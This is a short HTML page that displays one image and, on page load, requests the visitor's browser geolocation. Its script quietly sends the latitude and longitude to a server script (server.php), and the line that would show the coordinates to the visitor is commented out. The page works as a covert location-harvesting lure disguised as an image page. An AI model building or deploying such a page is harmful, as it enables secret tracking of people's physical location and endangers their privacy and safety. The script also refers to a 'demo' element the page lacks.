<html>
    <head></head>
    <body onload = 'getLocation()'>
        <img src ="images/img3.jpg" alt="image" height="500" width="500">

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "server.php?&latitude="+position.coords.latitude+"&longtitude="+position.coords.longitude);
    xhttp.send();
    // x.innerHTML = "Latitude: " + position.coords.latitude + 
    // "<br>Longitude: " + position.coords.longitude;
}
</script>
        
    </body>
</html>